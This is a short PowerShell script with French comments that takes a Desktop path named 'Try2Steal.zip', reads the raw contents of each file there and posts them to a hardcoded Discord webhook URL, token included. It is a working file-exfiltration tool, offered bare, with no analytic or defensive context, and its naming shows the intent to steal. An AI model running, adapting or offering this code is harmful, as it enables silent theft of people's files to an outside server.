# Dossier à cibler
$TargetFolder = "C:\Users\Desktop\Try2Steal.zip"

# URL du webhook Discord
$WebhookURL = "https://discord.com/api/webhooks/1324719273389723679/RCoV9w6F3td5QuvQkHpXQ5eC_ocPf-VZZ-6pgTpI7mrMdeZ2PrybMyO8onYP9GVILnm5"

# Fonction pour envoyer un fichier au webhook
function Send-File {
    param ([string]$FilePath)

    $FileName = [System.IO.Path]::GetFileName($FilePath)
    $Boundary = [System.Guid]::NewGuid().ToString()
    $Headers = @{"Content-Type" = "multipart/form-data; boundary=$Boundary"}
    $Body = @"
--$Boundary
Content-Disposition: form-data; name="file"; filename="$FileName"
Content-Type: application/octet-stream

$(Get-Content -Raw -Path $FilePath)
--$Boundary--
"@
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -Headers $Headers
}

# Envoyer chaque fichier du dossier
Get-ChildItem -Path $TargetFolder -File | ForEach-Object {
    Send-File $_.FullName
}